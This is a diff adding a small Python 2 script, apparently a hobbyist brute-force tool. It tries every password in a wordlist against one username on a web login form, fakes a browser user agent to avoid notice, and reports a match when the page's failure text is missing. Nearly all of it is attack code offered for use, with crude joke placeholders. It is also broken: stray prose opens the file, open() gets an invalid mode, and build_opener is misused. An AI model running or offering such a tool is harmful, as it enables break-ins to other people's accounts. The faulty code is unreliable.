@@ -1,0 +1,28 @@
+put File location directly here E.G yourmum/deskop/bruteforcehaxxerman
+
+#Name         : I dont know why these need a name its literally called bruteforce u simp man
+#Version      : V69.420
+#Writer(s)    : #Crabdude64
+
+import re, urllib, urllib2 ##can import system not required
+
+#Global vars 
+host = "wat"##Login form action URL
+usr = "notmepls" ##Username/email to hax
+wl = "ur mum" ##File path to wordlist
+badLogin ="put source here <-- -->"##What the page source throws for bad logins, this can be a partial word
+#Wordlist vars
+words = open(wl, "list").readlines()
+print "[+] Words loaded:", len(words)
+
+for word in words:
+    word = word.replace("\n","")##This will remove newlines.
+    loginSequence = [##Mimics web form.
+    ('mtyrie2', usr),##Name field name. Change if something else.
+    ('password', word)]##Password field name. Change if named something else.
+    loginData = urllib.urlencode(loginSequence)##Encode the data using urllib.
+    opener = urllib2.build_opener(host)##Create an opener from the "host" variable.
+    opener.addheaders = [('User-agent', 'Mozilla/5.0')]##Add a user-agent so we look like a web browser.
+    source = opener.open(host, loginData).read()##Get the source from the site using our form.
+    if re.search(badLogin,source) == None:##If the source doesn't have badLogin var true, hacked.
+        print "Successful Login:",usr, word
